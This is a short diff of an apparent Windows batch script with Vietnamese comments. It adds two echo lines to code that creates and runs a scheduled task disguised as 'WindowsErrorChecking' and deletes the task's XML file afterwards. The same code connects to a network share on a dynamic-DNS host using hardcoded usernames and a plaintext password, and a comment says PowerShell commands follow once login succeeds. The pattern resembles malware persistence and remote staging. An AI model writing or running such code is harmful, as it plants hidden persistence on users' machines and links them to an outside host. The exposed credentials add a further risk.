@@ -32,10 +32,12 @@ schtasks /create /tn "WindowsErrorChecking" /xml "C:\Windows\System32\WindowsPow
 del /f /q "C:\Windows\System32\WindowsPowerShell\windowserrorchecking.xml"
 start "" schtasks /Run /TN "WindowsErrorChecking"
 net use "\\minhtuan283.ddns.net\hdd25" /user:minhtuan283 Thienngan2002 /persistent:no
+echo User 1
 
 REM Nếu đăng nhập với user đầu tiên không thành công, thử user thứ hai
 if %errorlevel% neq 0 (
     net use "\\minhtuan283.ddns.net\hdd25" /user:giabao Thienngan2002 /persistent:no
+    echo User 2
 )
 
 REM Kiểm tra nếu đăng nhập thành công thì thực hiện các lệnh PowerShell
